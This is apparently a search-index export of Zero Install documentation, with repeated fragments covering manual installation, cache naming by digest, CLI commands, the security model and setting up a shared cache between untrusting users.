\"PYTHONPATH\" /> </requires> We need a library called http://rox.sourceforge.net/2005/interfaces/ROX-Lib . You might already have one somewhere, or your distribution might carry it. If all else fails, we could try to guess where a suitable feed might be... http://rox.sourceforge.net/2005/interfaces/ROX-Lib seems like a good place to start... Go back to step 1! You need to download ROX-Lib's feed, check the signature, pick a version, download and unpack the archive, check the contents' digest, and check whether ROX-Lib in turn depends on other libraries (it doesn't). Running with dependencies \u00b6 OK, so you've got ROX-Lib too now. Things should look like this: $ ls edit-2.0 Edit.xml rox-lib2-2.0.3 ROX-Lib.xml How can we tell Edit where we put ROX-Lib? Again, the answer is in Edit's XML file: <group main= \"Edit/AppRun\" > <requires interface= \"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\" > <environment insert= \"ROX-Lib2/python\" name= \"PYTHONPATH\" /> </requires> We need to add a directory inside our unpacked ROX-Lib to the $PYTHONPATH environment variable, and then try running Edit again: $ export PYTHONPATH = rox-lib2-2.0.3/ROX-Lib2/python $ ./edit-2.0/Edit/AppRun Finally Edit runs! Review \u00b6 So, what have we achieved? We've installed a program and its dependencies. We haven't touched anything outside of our test directory; no other programs on the system have been affected by this installation. We didn't need root access. We can undo the installation just by deleting our two XML files and the two unpacked archives. We didn't need to run any code from either Edit or ROX-Lib to perform the installation (we only ran them to test that it worked). If you have software for running programs in a restricted environment, you can install and run programs without even giving them write access to their own code. Finally, although it may have been a little tedious, everything we did could be automated. You could write a program to do all this for you (or use ours !). Tidying up \u00b6 Our home directory will become a big mess if we just install things in random directories. When we want to run another program that uses ROX-Lib, we'll want to be able to find the copy we already installed rather than downloading another copy. These files don't really need to be backed up. If we lost them, we could just download them again from the web. So, we'll put them in the ~/.cache directory which is designed for just this purpose. In fact, to avoid conflicts with other things using this directory, we'll keep everything under ~/.cache/0install.net , because it's all related to Zero Install. We have two XML files and two directories. What should we call them? It's not impossible to imagine there being two programs in the world both called Edit , so that's not a good name; we wouldn't know what to do if we wanted both on our system at once! A good choice is to use the full URL of Edit's feed for the XML file (replacing / characters with %2f in the traditional web way): $ mv Edit.xml \\ ~/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fEdit It's a bit ugly, but at least it's unique and we can find it again. We'll store ROX-Lib's XML in the same way: $ mv ROX-Lib.xml \\ ~/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fROX-Lib What about the directories with the actual program files? We could use the same strategy, naming it from the URL where we got it, but this has some problems. For example, there might be lots of places where you can get the archive (mirrors, peer-to-peer, CD-ROM, etc). We don't care how we got it, all we care about is that it has the right digest. So, we'll name it after that! $ mv edit-2.0 ~/.cache/0install.net/implementations/sha1 = 329e6c0191f65ef2996b49837d04c4cfe6934758 $ mv rox-lib2-2.0.3 ~/.cache/0install.net/implementations/sha1 = 6a2e548a80368bd8c2b5b3abedccf9a0a6cb4333 This is exactly the scheme that 0install uses.

We'll cheat, by using 0install to generate it for us: $ 0install digest edit-2.0 --algorithm = sha1 --manifest --digest D 1127294333 /Edit F 0cfc0b0c42b4f4c077f005f31ea1801a8e43bde0 1053080001 3409 .DirIcon ... X d6f4507353737e35ce7af5ab10a589e5a644bec5 1106998691 1472 testreplace.py sha1 = 329e6c0191f65ef2996b49837d04c4cfe6934758 This says we have a directory called Edit containing a file called .DirIcon , and so on. The last line isn't part of the manifest; it's the digest of the manifest itself. It is this value that must match the id in the feed. It's useful to save the manifest output (minus the last line) in case we want to do an audit later: $ 0install digest edit-2.0 --algorithm = sha1 --manifest > edit-2.0/.manifest This file will have the digest we require: $ sha1sum edit-2.0/.manifest 329e6c0191f65ef2996b49837d04c4cfe6934758 edit-2.0/.manifest","title":"Security note"},{"location":"details/#run-it","text":"We've downloaded and unpacked Edit. How do we run it? We don't have to guess; the answer is in the XML feed file: <group main= \"Edit/AppRun\" > There was no main attribute on the implementation element, so we look in the containing group and find one. This tells us that we can run the program by executing the file Edit/AppRun inside the unpacked directory. $ ./edit-2.0/Edit/AppRun *** This program needs ROX-Lib2 ( version 1 .19.14 ) to run.

We've installed a program and its dependencies. We haven't touched anything outside of our test directory; no other programs on the system have been affected by this installation. We didn't need root access. We can undo the installation just by deleting our two XML files and the two unpacked archives. We didn't need to run any code from either Edit or ROX-Lib to perform the installation (we only ran them to test that it worked). If you have software for running programs in a restricted environment, you can install and run programs without even giving them write access to their own code. Finally, although it may have been a little tedious, everything we did could be automated. You could write a program to do all this for you (or use ours !).","title":"Review"},{"location":"details/#tidying-up","text":"Our home directory will become a big mess if we just install things in random directories. When we want to run another program that uses ROX-Lib, we'll want to be able to find the copy we already installed rather than downloading another copy. These files don't really need to be backed up. If we lost them, we could just download them again from the web. So, we'll put them in the ~/.cache directory which is designed for just this purpose. In fact, to avoid conflicts with other things using this directory, we'll keep everything under ~/.cache/0install.net , because it's all related to Zero Install. We have two XML files and two directories. What should we call them? It's not impossible to imagine there being two programs in the world both called Edit , so that's not a good name; we wouldn't know what to do if we wanted both on our system at once! A good choice is to use the full URL of Edit's feed for the XML file (replacing / characters with %2f in the traditional web way): $ mv Edit.xml \\ ~/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fEdit It's a bit ugly, but at least it's unique and we can find it again. We'll store ROX-Lib's XML in the same way: $ mv ROX-Lib.xml \\ ~/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fROX-Lib What about the directories with the actual program files? We could use the same strategy, naming it from the URL where we got it, but this has some problems. For example, there might be lots of places where you can get the archive (mirrors, peer-to-peer, CD-ROM, etc). We don't care how we got it, all we care about is that it has the right digest. So, we'll name it after that! $ mv edit-2.0 ~/.cache/0install.net/implementations/sha1 = 329e6c0191f65ef2996b49837d04c4cfe6934758 $ mv rox-lib2-2.0.3 ~/.cache/0install.net/implementations/sha1 = 6a2e548a80368bd8c2b5b3abedccf9a0a6cb4333 This is exactly the scheme that 0install uses.

Returns an exit status of 0 if it selected a suitable set of versions and they are now all downloaded and in the cache; returns a status of 1 otherwise. update Checks for updates to the program and download them if found. This is similar to 0install download --refresh , except that it prints information about whether any changes were found. run Behaves similarly to 0install download , except that it also runs the program after ensuring it is in the cache. Returns an exit status of 1 if the download step failed. Otherwise, the exit status will be the exit status of the program being run. import Imports a feed from a local file, as if it had been downloaded from the network. This is useful when testing a feed file, to avoid uploading it to a remote server in order to download it again. The file must have a trusted digital signature, as when fetching from the network. export (Windows only) Exports all feeds and implementations required to launch the program specified by a URI to a DIRECTORY . search Searches for feeds indexed by the mirror server that match specified keywords. Note that the default mirror server indexes all known feeds, regardless of quality; you must decide whether to trust the programs before running them. list Lists all locally known feed URIs. If a search term is given, only URIs containing that string are shown (case insensitive). catalog search (Windows only) Searches registered catalogs for applications that match the specified query. If no query is given all applications in the catalogs are listed. catalog refresh (Windows only) Refreshes (downloads) all registered catalogs. catalog add (Windows only) Adds an URI to the list of catalogs. catalog remove (Windows only) Removes an URI from the list of catalogs. catalog reset (Windows only) Resets the list of catalogs to the default source. catalog list (Windows only) Lists all registered catalogs. config View or change configuration settings. With no arguments, it displays all settings and their current values. With one argument, it displays the current value of the named setting. With two arguments, it sets the setting to the given value or resets it to the default value if the value default is given. add-feed Register an additional source of implementations (versions) of a program. remove-feed Un-registers a feed, reversing the effect of 0install add-feed . list-feeds Lists all extra feeds added to URI using 0install add-feed . digest Calculates the manifest digest of a directory or archive. store add Adds the contents of a directory or archive to the cache. store audit Checks that all implementations in the cache are undamaged. Additional arguments specify custom cache locations. store copy Copies an implementation into the cache. Similar to 0install store add , but the digest is extracted from the directory name. An additional arguments specifies a custom target cache location. store export (Windows only) Exports a cached implementation as an archive (ZIP, TAR, etc.). The result can be imported on another machine using 0install store add . store find Determines the local path of a cached implementation. store list Lists all implementation cache directories. store list-implementations (Windows only) Lists all cached implementations. If a feed URI is specified only implementations for that particular feed are listed. store manage Displays a graphical user interface for managing implementations in the cache. Shows associations with cached feeds. store optimise Saves disk space by merging identical files with hardlinks. Additional arguments specify custom cache locations. store purge (Windows only) Removes all implementations from the cache. Use this command to clean up the system before removing Zero Install. Deleting cache directories manually may be difficult due to the NTFS ACLs employed to protect implementations against modification. Additional arguments specify custom cache locations. store remove Removes an implementation from the cache. store verify Makes sure an implementation has not been damaged (i.e. it manifest digest has not changed). store add-dir (Windows only) Adds a directory to the list of custom implementation caches. store remove-dir (Windows only) Removes a directory from the list of custom implementation caches. central (Windows only) Opens the central graphical user interface for launching and managing applications. add Add an application to the application list. remove (Windows only) Removes an application from the application list and undoes any desktop environment integration. remove-all (Windows only) Removes all applications from the application list and undoes any desktop environment integration. Use this command to clean up the system before removing Zero Install. destroy (Linux only) Removes an application. show (Linux only) Shows the current selections for an application whatchanged (Linux only) Shows the differences between the current and previous selections for an application. man (Linux only) Shows the man-page of a given command. integrate (Windows only) Adds an application to the application list (if missing) and integrate it into the desktop environment. alias (Windows only) Create an alias for launching an application via 0install without always having to enter the full URI. list-apps (Windows only) Lists all applications currently in your application list. If a search term is given, only application names containing that string are shown (case insensitive). update-all (Windows only) Updates all applications in the application list. repair-all (Windows only) Reapplies all desktop integrations of applications in the application list. sync (Windows only) Synchronizes the application list with the server. import-apps (Windows only) Imports a set of applications and desktop integrations from an existing app-list.xml file. self deploy (Windows only) Deploys Zero Install to the specified TARGET directory or the default directory for programs and integrates it in the system. self remove (Windows only) Removes the current instance of Zero Install from the system. self update (Windows only) Updates Zero Install itself to the most recent version.","title":"Command-line interface"},{"location":"details/cli/#select","text":"Selects a version of the program identified by URI, and compatible versions of all of its dependencies.

For example: $ 0install export --include-zero-install https://apps.0install.net/gui/vlc.xml somedir The resulting directory structure will look something like this: somedir\\import.cmd A batch script for importing the contents on a machine that already has Zero Install set up. somedir\\run VLC media player.exe A modified version of the Bootstrapper for importing the contents and then running VLC on a machine that may not have Zero Install set up yet. somedir\\content\\22EA111A7E4242A4.gpg somedir\\content\\85A0F0DAB46EE668.gpg somedir\\content\\https%3a##apps.0install.net#0install#0install-win.xml somedir\\content\\https%3a##apps.0install.net#dotnet#framework.xml somedir\\content\\https%3a##apps.0install.ne#/gui#vlc.xml The downloaded feeds and the GnuPG keys used to sign them. somedir\\content\\sha256new_K44G7XQ4SOWRHVVFSXDW737RFQAKICZE6MAX35OJ7DJHABZKSLVQ.tbz2 somedir\\content\\sha256new_Z7MMJYZMBDNZMQKRUNOA3IEWGB7AXITJWCLK7RRXFIQ2EVBUX5JQ.tbz2 The implementations selected for VLC and Zero Install compressed as TAR BZ2 archives and named by their digests.

Configuration files and caches \u00b6 The Linux and Windows versions mostly use the same formats for configuration files and caches.

In the Windows counterpart %appdata%\\0install.net\\injector\\interfaces these are encoded as %3a . When extracting implementations Zero Install preserves executable-bits and symlinks and considers them when calculating manifest digests . Windows does not have a concept of executable bits. Instead, Zero Install for Windows stores this information in a file called .xbit in the top-level directory of each implementation. On Windows Administrator privileges are required to create symlinks. Therefore Zero Install creates Cygwin-style symlinks instead of \"real\" NTFS symlinks.

You can register additional feeds to be considered (e.g., a local feed with custom builds or an alternate remote feed). This can be done either using the GUI or with the 0install add-feed command. Versions \u00b6 In the Versions tab, you can use the Preferred Stability setting in the interface dialog to choose which versions to prefer. You can also change the stability rating of any implementation by clicking on it and choosing a new rating from the popup menu (drop-down in the Override column on Windows). User-set ratings are shown in capitals. As you make changes to the policy and ratings, the selected implementation will change. The version shown in bold (or at the top of the list, in some versions) is the one that will actually be used. In addition to the ratings below, you can set the rating to Preferred . Such versions are always preferred above other versions, unless they're not cached and you are in Off-line mode. The following stability ratings are allowed: Stable (this is the default if Help test new versions is unchecked) Testing (this is the default if Help test new versions is checked) Developer Buggy Insecure Stability ratings are kept independently of the implementations, and are expected to change over time.

If problems are found, it will instead be marked as Buggy , or Insecure . Neither will be selected by default, but it is useful to see the reason (you might opt to continue using a buggy version if it works for you, but should never use an insecure one). Developer is like a more extreme version of Testing , where the program is expected to have bugs. Tip If you want to use the second item on the list because the first is buggy, for example, then it is better to mark the first version as buggy than to mark the second as preferred.

Neither will be selected by default, but it is useful to see the reason (you might opt to continue using a buggy version if it works for you, but should never use an insecure one). Developer is like a more extreme version of Testing , where the program is expected to have bugs. Tip If you want to use the second item on the list because the first is buggy, for example, then it is better to mark the first version as buggy than to mark the second as preferred. This is because when a new version is available, you will want that to become the version at the top of the list, whereas a preferred version will always be first.","title":"Versions"},{"location":"details/security/","text":"Security \u00b6 This page describes Zero Install's security model. I've noticed that if you describe a security model with digital signatures and GPG keys, people start worrying about all kinds of unlikely theoretical exploits. Whereas if you just stick software on the web with no security what-so-ever, everyone seems completely happy to use it. But for those few people who do care about security, this document explains how Zero Install tries to improve the situation. Overview \u00b6 No-one has the time to verify every line of code in every program they use. Yet, we need to use these programs to process our data, and we must guard against the possibility that the code we use is malicious. We need methods to help ensure that we don't allow malicious code to run, to limit the damage it can do if we do run it, and to discover and recover from compromises when they do happen. Some key points about Zero Install's security model: If one user downloads a malicious program, other users aren't affected In traditional systems, installing a program also puts files into shared directories like /usr/bin and /usr/lib under short names. So if one user installs the Gimp from http://evil.com then it might save the executable as /usr/bin/gimp . Another user might run this, thinking it was from http://gimp.org . In a Zero Install system, users specify the full URI of the program they want to run, and the system only shares the copy if they really are the same. The short-cuts (e.g., that \"Run gimp\" means \"Run http://gimp.org/gimp\" ) are per-user, but the programs themselves are shared. Installation does not execute any downloaded code Most installation systems run code in the downloaded package as part of the installation process. Typically, these scripts are run as root and can do anything they like to the machine. Zero Install merely fetches files into the cache during installation; nothing downloaded is executed and files from different packages cannot conflict (because they each go in their own directory). Digital signatures are always checked before software is run To protect against the possibility of attackers breaking into a web-server and replacing the real software with modified versions, or redirecting network traffic to the real web-server to their own, Zero Install only runs code that is signed by a GPG key you trust to provide software from that web-site. By default, it will automatically approve keys known to the key information server; this can be disabled from the preferences dialog. Security when running programs is your problem Zero Install goes to great lengths to get software on to your machine without letting it do anything dangerous, but what happens next is up to you. On a normal Linux system this still brings some benefits (e.g. users can share programs without also sharing viruses), but the real advantages come when you combine this with some sandboxing technology to restrict what programs can do when running. Demo! \u00b6 For a demonstration of using sandboxing with Zero Install, see ebox . Authorisation vs Privileges \u00b6 It's also important to separate out two aspects of installation that are easily confused: who is authorised to install software and what privileges the software is given by the act of installing it. Here, \"apt-get\" is used as a short-hard for \"a typical traditional Linux package manager\": Privileges granted Only root can install things Anyone can install things Full access Default apt-get apt-get with modified rules No access Zero Install with restrictions Default Zero Install A typical package manager only allows root (or an administrator) to install software by default, and grants that software full access to the machine, including access to all user accounts. You can change the rules to allow others to install software (e.g. using PolicyKit or sudoers, you might allow anyone to upgrade a package), but the software still gets complete access to the machine. Zero Install allows anyone to install software by default, but gives the software no access to the machine (since it doesn't run any of its code at install time). You could configure Zero Install so that only root can install software, but the software would still get no ability to do anything at install time. The reason we allow anyone to install software by default is the principle of Do Not Prohibit What You Cannot Prevent [citation needed]. On Linux, unprivileged users can install software even without Zero Install, so trying to stop them makes life harder for legitimate users but doesn't improve security. Security and Usability \u00b6 Some people think of security and usability as a trade-off, with systems being either easy to use, or secure, but not both. But in fact, security is a necessary part of usability. Some examples: I used to program on a system which had no memory protection, allowing any process to overwrite any other process's memory. Linux prevents programs from doing this. This makes my life as a programmer easier, not harder, because when a program crashes I know that the problem is in that program and not in some other one. Sometimes, I forget where I saved a file. But, I never need to search /usr in case I accidentally saved my letter there; it can't be there, because my word processor doesn't have permission to save there. People often find their computers are infected with spyware and adware, which slows them down, causes crashes, and redirects them to undesirable web sites. Such a system has poor usability. An artist may find a useful image processing filter on the web. If all this filter can do is read an input image and output a modified one then the artist is more likely to try it (and produce better work). If image filters can seriously damage the system then the artist may have to pass it over; the risk from a malicious filter is too great. Few programs are as easy to run in a restricted environment as the image filter example above; an accounting package needs access to my accounts, for example. Still, with good security we can evaluate lots of possible programs and then only weigh up the risk for the one we choose. Without good security we must evaluate fewer programs, and we are at risk from each one we try. Good security is therefore vital to a usable system. A usable system must be understandable and predictable; on a system where any action can have any consequence this is not possible. Consider traditional software installation on Linux or Windows. You download some package and execute a script inside it. Imagine that I give you a package in your favourite format (setup.exe, .deb, .rpm, source tarball, etc) and ask you to install it. Assume that your system is functioning correctly; what will happen as a result of installing this program? Will a new item appear on your Start menu (or equivalent)? Will some other program on your computer stop working as a result of a installing this one? Will a new service be added to your boot sequence? Will your browser's saved passwords be posted to an IRC server and your hard disk reformatted? The answer, for all the formats listed above, is \"I don't know\". With Zero Install, none of these things can happen without some extra action on your part. Now, Zero Install is not a complete solution to these problems. In particular, it does not stop programs from doing any of these things when run . That problem is for some other project to solve (and there are plenty of people working on this; see Plash or SysTrace for example). But Zero Install already brings benefits without the use of these programs (the effects above which require root access will be blocked), and it is clearly a necessary base on which such technologies can be built. Being able to run software in a sandbox is of limited benefit if it requires full root access to install it first! Zero Install's trust model \u00b6 Sandboxing is used to restrict what code can do. Linux and similar systems come with a simple sandboxing system based on users. The system has a number of users, and each user can run whatever software they please. Ideally, it is not possible for malicious code executed by one user to damage the system or threaten the security of any other user. However, the code can do anything that the user running it is permitted to do (such as delete that user's files, or log the user's keystrokes and send them to another computer). A second approach is to ensure that only software written by trusted individuals is run. This presents two problems: how do we come to trust someone to provide reliable software, and how do we know that a particular program really came from them? The basis of Zero Install's model is the standard multi-user model used by Linux. The principle is that the system's responsibility is to protect users from each other, and to protect the system from the users. If one user (or a program they run) can delete another user's files without permission, then that is a problem with the system's security. However, the system is not responsible for protecting users from themselves; it is up to users to take appropriate measures to prevent the programs they run from damaging their own files, for example. Of course, the system may itself have bugs. Ideally, the system should be upgraded when a problem is found (e.g. in the Linux kernel). However, if users are using sandboxing to protect themselves from the programs they run then this may provide an added layer of protection to the system, assuming the users themselves are not malicious. Users can protect themselves by using additional sandboxes within their own sandboxed user account. A good example of this is User-Mode-Linux , which runs a new Linux system within a single user account of a main Linux system. The user can use the sub-Linux's security features to restrict what applications can do inside it, while the whole sub-Linux system is restricted to the user's permissions within the main Linux system. More light-weight sandboxes include running JavaScript in a web browser, or running Java applications with Java's sandboxing turned on. However, good per-user sandboxing is still more of a long-term goal for Linux than a practical solution for many programs at the moment (but see Plash for a good example of where things are heading). Also, some programs really do need full access to the user's files. For example, a file manager needs to be able to delete the user's files, and an email client needs to be able to read the user's emails and send new ones, so making sure that software is not malicious in the first place is very important. When deciding whether to trust a particular programmer, the user will have to consult external sources. Distributions typically fill this role (recommending certain programs only), and friends, magazines, etc, can provide this information too. A trusted programmer is identified by their GPG key's fingerprint. When the user runs a program, Zero Install downloads the feed and checks that it is signed by someone the user trusts. If not, the user is asked to confirm that they trust the holder of the key to provide software to them: Once trusted, Zero Install will accept any feed from the same domain signed by that key. Zero Install updates feeds at the request of the user (clicking the 'Refresh' button), or automatically (monthly, by default) if the user sets their freshness policy to request this. If a program is not used, Zero Install does not check for updates to it. Zero Install does not accept incoming network connections, so even if a malicious key is trusted, the owner must still get the user to download a feed they control. Possible attacks \u00b6 To run malicious software on a user's machine, an attacker could: Publish the software on their own web-page, and convince users to run it, or Cause their software to be run when the user tries to run some other program. Guarding against the first requires educating users not to run untrusted software (this applies whether using Zero Install or not), sandboxing any software that is run if possible, and advising users that the software is unknown and/or known to be malicious. Organisations may wish to keep their own internal database of programs approved for use within the organisation, and to prevent users from installing programs not on this list. To perform the second attack, the attacker needs to replace a trusted feed file on a server with a compromised version. However, the new file must be signed, and the secret signing key should not be on the server. Therefore, the attacker has two options: Break into the developer's private machine, get their private GPG key, install a keystroke logger, and get the GPG pass-phrase. Then break into the web server and install a compromised signed feed. Break into the webserver and install a feed signed with their own key (a new key with a new fingerprint, but claiming to belong to the original author), and trick users into accepting it. The second option is probably easiest. Zero Install currently warns users if they run software signed with an unknown GPG key (we maintain a default database of known keys, but we do not have the resources to verify the owners of the keys). Again, organisations may wish to keep their own white-list of allowed keys. The first option can be made even harder if the developer has a second (non-networked) machine with the GPG key, although not all developers will have a spare machine for this purpose. Conclusions \u00b6 We have discussed the need for security and the differences between traditional software installation systems and Zero Install. While installing software with traditional systems can cause arbitrary changes to your system, Zero Install does not run any of the downloaded code during installation; it merely unpacks files to a new directory. Securing the installation process is not the whole story; software should also be executed in a restricted environment. Several other projects are developing suitable sandboxes. Even without such extra programs, the default security mechanisms built in to Linux provide improvements over traditional installation. Whether we have strong sandboxing or not, it is important to know where software has come from and to only accept digitally signed software. Zero Install maintains a list of trusted keys, and aids the user's decision of whether to trust a key using its database of known keys. The default database provides only low security; organisations may wish to provide their own database and perform real verification checks on authors. Organisations may also wish to prevent users from installing unapproved software at all. An attacker wishing to install malicious software must either trick users into trusting them, or steal a trusted developer's GPG key. This is considerably more secure than most other distribution systems, many of which contain no security at all.","title":"Security"},{"location":"details/security/#security","text":"This page describes Zero Install's security model.

Most packaging systems require users to have root access in order to share software (either the root password, or admin access through sudo). However, this is a security risk. Zero Install allows software to be shared automatically and safely between mutually-untrusting users. Note This page is about sharing between users on a single computer. If you want to do peer-to-peer sharing on a LAN, see 0share . If you want to share between virtual machines running on a single host, see virtual machines . How it works \u00b6 A digest is a short value calculated from a (usually much bigger) file. There are various different algorithms that can be used. For example, this command calculates the SHA1 digest of the ls binary: $ sha1sum /bin/ls 90b703d3d29ef20f3ef711eb38625d618c70c4f6 /bin/ls A cryptographic digest (like SHA1) is one where it is believed to be infeasibly difficult to create a different program with the same digest. So, if someone gives you a binary with digest above, you can be sure that it's identical to the version of ls that I'm using. Cryptographic digests are the basis of secure sharing in Zero Install. Here's we'll see an example of how two users (Alice and Bob) can share the ROX-Filer program, even if they don't trust each other. First, Alice runs ROX-Filer: Alice visits rox.sourceforge.net and downloads the small ROX-Filer.xml feed file. She decides to run ROX-Filer version 2.5 from this file. The Zero Install software gets the digest for this version ( sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 ) from the file. It also downloads the package and unpacks it. The software passes the unpacked archive to the privileged helper, which checks the digest and copies the directory to /var/cache/0install.net/implementations/sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 on Linux or C:\\ProgramData\\0install.net\\implementations\\sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 on Windows (see File locations ). ROX-Filer runs. Later, Bob decides to run it too. The system doesn't need to download a second copy: Bob visits rox.sourceforge.net and downloads the small ROX-Filer.xml feed file. He decides to run ROX-Filer version 2.5 from this file. The Zero Install software gets the digest for this version ( sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 ) from the file. Zero Install sees that the directory /var/cache/0install.net/implementations/sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 (or C:\\ProgramData\\0install.net\\... ) already exists, so it doesn't download the software again. ROX-Filer runs. But what if we have a malicious user, Charlie? A new machine arrives, and Charlie decides to install a malicious version of ROX-Filer before anyone else installs a good copy: Charlie visits rox.sourceforge.net and downloads the small ROX-Filer.xml feed file. He decides to use ROX-Filer version 2.5 from this file. The Zero Install software gets the digest for this version ( sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 ) from the file. It also downloads the package and unpacks it. Charlie modifies the download to do something nasty (or, the download has been tampered with, or Charlie's account has been infected with a virus which modifies it, etc). If Charlie tries to install the result to /var/cache/0install.net/implementations/sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 , the privileged helper rejects it, because the digest of the directory's contents no longer matches that name. Charlie is forced to install his malicious version as /var/cache/0install.net/implementations/sha1=3ab21d8f410e3a5a863d3a32a152edb31ba42f75 instead. When Alice runs ROX-Filer as before, the software sees that /var/cache/0install.net/implementations/sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 doesn't exist and downloads a genuine copy as before. When Bob runs ROX-Filer, he will use Alice's version. You might be worried that Charlie was able to put malicious code in the shared cache. However, it doesn't matter because other users won't try to run it, since it doesn't have the name they're looking for. Of course, it might not even be malicious: a program that deletes files is malicious if it's called cat , but not if it's called rm . As long as users don't go around running random binaries they find in the cache, they're OK. Setting up sharing \u00b6 Linux \u00b6 These instructions require Zero Install version 0.30 or later. The actual code for doing sharing this way is currently experimental and not enabled by default. This section shows how the system administrator (someone with root access) can enable it. It is probably best not to do this in security critical environments yet as we're still working on tightening the security. Feedback welcome. This diagram shows the four processes involved in adding a new package to the system cache. If you have a different environment, you can use a different 'helper' script to integrate it with Zero Install. Install 0install version 0.30 or later. Create a new system user called 'zeroinst' (the Ubuntu package will have done this for you automatically). ## useradd -d /var/cache/0install.net --system zeroinst Create the shared directory, owned by this new user (also done automatically by the Ubuntu package): ## mkdir -p /var/cache/0install.net/implementations ## chown zeroinst /var/cache/0install.net/implementations Create /usr/local/bin/0store-secure-add-helper with: #!/bin/sh exec sudo -S -u zeroinst /usr/bin/0store-secure-add \" $@ \" < /dev/null Note The path will be /usr/local/bin/0store-secure-add if you installed from source. Make your new script readable and executable by everyone: ## chmod a+rx /usr/local/bin/0store-secure-add-helper Use visudo to add these lines to /etc/sudoers : Defaults>zeroinst env_reset,always_set_home ALL ALL =( zeroinst ) NOPASSWD: /usr/bin/0store-secure-add Attention The NOPASSWD line must go at the end of the file, otherwise it is likely to be overridden by later entries. Again, use /usr/local/bin if you installed from source. When launch wants to install a package, it will invoke 0store-secure-add-helper . This script uses sudo to run 0store-secure-add as the zeroinst user, with a clean environment. No password is required for this. AppArmor policy \u00b6 The following AppArmor policy can be used to confine the 0store-secure-add process somewhat. However, the process does need read access everywhere (since it could be copying from anywhere) and write access to the entire cache directory, so this doesn't restrict it much more than it already is due to running as a separate user. #include <tunables/global> /usr/bin/0store-secure-add { #include <abstractions/base> #include <abstractions/python> /** r, /usr/bin/0store-secure-add mr, /usr/bin/python* ixr, /var/cache/0install.net/implementations/** rw, } Windows \u00b6 On Windows the shared cache is managed by the Zero Install Store Service . It serves roughly the same role as 0store-secure-add on Linux. This service ensures that no user can, intentionally or unintentionally, manipulate the contents of the shared cache. Every user can ask the service to add implementations to the shared cache on their behalf after validating the hash. This way other users only get cached implementations if they request the exact same version with the same hash. The Zero Install Store Service is installed automatically when Zero Install is deployed for all users (machine-wide). Zero Install automatically uses the service when it is available (unless in portable mode ) and falls back to the user cache if the service is unavailable. The service uses C:\\ProgramData\\0install.net\\implementations (see File locations ) for storing implementations by default. A custom location can be specified in the file C:\\ProgramData\\0install.net\\injector\\implementation-dirs . When using a custom location make sure it is only writeable by SYSTEM and Administrators and readable by Everyone . Technical details \u00b6 Zero Install communicates with the service using named pipes . The user process downloads an archive to a temporary directory and then passes its file path to the service with a request for extraction. The service extracts the archive, verifies the manifest digest and adds the implementation to the cache. During the entire process the service reports the progress back to the user process. Named pipes allow the service to impersonate the calling user. The archive is read and extracted using the privileges of the calling user but verified and added to the cache using the privileges of the service. The service records write access to the cache as well as any potential problems in the Windows Event Log . Questions \u00b6 How do users uninstall? Currently, they can't. You (the admin) can delete directories from /var/cache/0install.net/implementations to save space (preferably not while they're being used ;-). Ideally, we should track which users have requested which programs and remove them automatically when no-one wants them anymore. What kind of things need 'tightening'? Several things spring to mind: What happens if the user changes the directory whilst it's being added? We need to audit 0store-secure-add . Denial of service attacks, if one user stores lots of stuff (need quotas). Why do things still get stored in ~/.cache after setting this up? Things you've already installed will remain there. Only new software is added in the system cache. Also, the old sha1 algorithm isn't accepted by the helper, so software using that can't go in the shared cache. If you still have problems, try running 0install run -vvc URI (to see debug output). Finally, make sure your script is executable!","title":"Sharing downloads between users"},{"location":"details/sharing/#sharing-downloads-between-users","text":"On systems with multiple users, it would be very inefficient if each user had to download their own copy of each program. Most packaging systems require users to have root access in order to share software (either the root password, or admin access through sudo). However, this is a security risk. Zero Install allows software to be shared automatically and safely between mutually-untrusting users. Note This page is about sharing between users on a single computer. If you want to do peer-to-peer sharing on a LAN, see 0share . If you want to share between virtual machines running on a single host, see virtual machines .","title":"Sharing downloads between users"},{"location":"details/sharing/#how-it-works","text":"A digest is a short value calculated from a (usually much bigger) file. There are various different algorithms that can be used. For example, this command calculates the SHA1 digest of the ls binary: $ sha1sum /bin/ls 90b703d3d29ef20f3ef711eb38625d618c70c4f6 /bin/ls A cryptographic digest (like SHA1) is one where it is believed to be infeasibly difficult to create a different program with the same digest. So, if someone gives you a binary with digest above, you can be sure that it's identical to the version of ls that I'm using. Cryptographic digests are the basis of secure sharing in Zero Install. Here's we'll see an example of how two users (Alice and Bob) can share the ROX-Filer program, even if they don't trust each other. First, Alice runs ROX-Filer: Alice visits rox.sourceforge.net and downloads the small ROX-Filer.xml feed file. She decides to run ROX-Filer version 2.5 from this file. The Zero Install software gets the digest for this version ( sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 ) from the file. It also downloads the package and unpacks it. The software passes the unpacked archive to the privileged helper, which checks the digest and copies the directory to /var/cache/0install.net/implementations/sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 on Linux or C:\\ProgramData\\0install.net\\implementations\\sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 on Windows (see File locations ). ROX-Filer runs. Later, Bob decides to run it too. The system doesn't need to download a second copy: Bob visits rox.sourceforge.net and downloads the small ROX-Filer.xml feed file. He decides to run ROX-Filer version 2.5 from this file. The Zero Install software gets the digest for this version ( sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 ) from the file. Zero Install sees that the directory /var/cache/0install.net/implementations/sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 (or C:\\ProgramData\\0install.net\\... ) already exists, so it doesn't download the software again. ROX-Filer runs. But what if we have a malicious user, Charlie? A new machine arrives, and Charlie decides to install a malicious version of ROX-Filer before anyone else installs a good copy: Charlie visits rox.sourceforge.net and downloads the small ROX-Filer.xml feed file. He decides to use ROX-Filer version 2.5 from this file. The Zero Install software gets the digest for this version ( sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 ) from the file.

